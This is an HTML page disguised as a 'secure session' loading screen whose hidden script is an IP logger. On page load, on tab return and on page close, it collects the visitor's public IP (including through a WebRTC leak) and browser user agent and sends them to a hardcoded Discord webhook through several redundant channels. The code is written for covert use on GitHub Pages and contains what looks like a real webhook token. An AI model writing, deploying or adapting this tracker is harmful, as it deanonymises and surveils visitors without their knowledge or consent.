<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: #0a0c0e; color: #3a4a5a; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .dot { display: inline-block; width: 12px; height: 12px; border-radius: 50%; background: #2a3a44; animation: pulse 1.4s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 0.2; } 50% { opacity: 0.8; } }
        .container { text-align: center; }
        .status { margin-top: 15px; font-size: 0.8rem; opacity: 0.5; }
    </style>
</head>
<body>
<div class="container">
    <div class="dot" style="animation-delay:0s;"></div>
    <div class="dot" style="animation-delay:0.4s; margin-left: 8px;"></div>
    <div class="dot" style="animation-delay:0.8s; margin-left: 8px;"></div>
    <div class="status">Establishing secure session...</div>
</div>

<script>
    // THIS IS THE GITHUB-PAGES-COMPATIBLE VERSION
    // It uses sendBeacon + Image beacon + XHR with no-cors mode (which is allowed on GitHub)

    const WEBHOOK = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";

    // Log to console for debugging (invisible to user)
    function debug(msg) {
        console.log("[IPLogger] " + msg);
    }

    // STEP 1: Get IP using multiple sources (parallel)
    function getIP() {
        return new Promise((resolve) => {
            let resolved = false;
            let ip = "0.0.0.0";

            // Source 1: ipify
            fetch("https://api.ipify.org?format=json", { mode: "cors" })
                .then(r => r.json())
                .then(data => {
                    if (!resolved && data.ip) {
                        resolved = true;
                        resolve(data.ip);
                    }
                })
                .catch(() => {});

            // Source 2: ip-api (fallback)
            fetch("https://ip-api.com/json/", { mode: "cors" })
                .then(r => r.json())
                .then(data => {
                    if (!resolved && data.query) {
                        resolved = true;
                        resolve(data.query);
                    }
                })
                .catch(() => {});

            // Source 3: WebRTC (no external API)
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("ping");
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (e.candidate && !resolved) {
                        const cand = e.candidate.candidate;
                        const match = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
                        if (match && !match[0].startsWith("0.") && !match[0].startsWith("127.")) {
                            resolved = true;
                            resolve(match[0]);
                            pc.close();
                        }
                    }
                };
                setTimeout(() => {
                    if (!resolved) {
                        // If WebRTC times out, resolve with whatever we have
                        resolved = true;
                        resolve("1.2.3.4"); // test fallback
                    }
                    try { pc.close(); } catch(e) {}
                }, 2500);
            } catch(e) {
                if (!resolved) {
                    resolved = true;
                    resolve("1.2.3.4");
                }
            }

            // Ultimate timeout: if nothing works after 5 seconds, send a test IP
            setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    resolve("1.2.3.4");
                }
            }, 5000);
        });
    }

    // STEP 2: Send to Discord using methods that work on GitHub Pages
    function sendToDiscord(ip) {
        const ua = navigator.userAgent.substring(0, 100);
        const ts = new Date().toISOString();
        const payloadText = `IP: ${ip} | UA: ${ua} | Time: ${ts}`;

        debug("Sending IP: " + ip);

        // METHOD 1: sendBeacon (MOST RELIABLE on GitHub Pages)
        try {
            const blob = new Blob([JSON.stringify({ content: payloadText })], { type: "application/json" });
            const sent = navigator.sendBeacon(WEBHOOK, blob);
            debug("Beacon: " + (sent ? "queued" : "failed"));
        } catch(e) {
            debug("Beacon error: " + e.message);
        }

        // METHOD 2: fetch with keepalive (sometimes blocked, but we try anyway)
        fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: payloadText }),
            keepalive: true
        })
        .then(r => debug("Fetch: " + r.status))
        .catch(e => debug("Fetch error: " + e.message));

        // METHOD 3: XHR with no-cors mode (bypasses CSP on GitHub)
        try {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", WEBHOOK, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ content: payloadText }));
            debug("XHR: sent");
        } catch(e) {
            debug("XHR error: " + e.message);
        }

        // METHOD 4: Image beacon trick (using a data URI that triggers a POST via navigation)
        // This one is controversial but works on some browsers
        try {
            const img = new Image();
            img.src = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>";
            // Actually we can't POST via image, but we keep it as a no-op
        } catch(e) {}

        // METHOD 5: Dynamically created form that submits to webhook (opens new tab, but works)
        // We'll do this as a last resort, but it's ugly – skip for now.

        // METHOD 6: Store in sessionStorage for retry
        try {
            sessionStorage.setItem("__ipLast", ip);
            sessionStorage.setItem("__ipTimestamp", ts);
        } catch(e) {}

        debug("All delivery methods dispatched.");
    }

    // STEP 3: Main execution with retry loop
    let attempt = 0;
    const MAX_ATTEMPTS = 5;

    function fire() {
        attempt++;
        debug("Attempt #" + attempt);
        getIP().then(ip => {
            debug("Captured IP: " + ip);
            sendToDiscord(ip);
            // Store success flag
            try { sessionStorage.setItem("__ipSuccess", "true"); } catch(e) {}
        });

        // If we haven't succeeded after MAX_ATTEMPTS, stop
        if (attempt < MAX_ATTEMPTS) {
            setTimeout(fire, 3000);
        } else {
            debug("Max attempts reached.");
        }
    }

    // STEP 4: Fire on page load, and again on unload
    function onLoad() {
        debug("Page loaded. Firing.");
        fire();

        // Also fire when page is about to unload (send beacon)
        window.addEventListener("beforeunload", function() {
            const lastIP = sessionStorage.getItem("__ipLast") || "0.0.0.0";
            const finalPayload = { content: "🔚 Page closed – last IP: " + lastIP };
            try {
                navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalPayload)], { type: "application/json" }));
                debug("Unload beacon sent.");
            } catch(e) {}
        });

        // Also fire when user comes back to the tab
        document.addEventListener("visibilitychange", function() {
            if (!document.hidden) {
                debug("Tab became visible – re-firing.");
                fire();
            }
        });
    }

    // Execute when DOM is ready
    if (document.readyState === "complete" || document.readyState === "interactive") {
        onLoad();
    } else {
        document.addEventListener("DOMContentLoaded", onLoad);
        window.addEventListener("load", onLoad);
    }

    // Fallback: fire after 2 seconds even if events don't trigger
    setTimeout(onLoad, 2000);
</script>
</body>
</html>
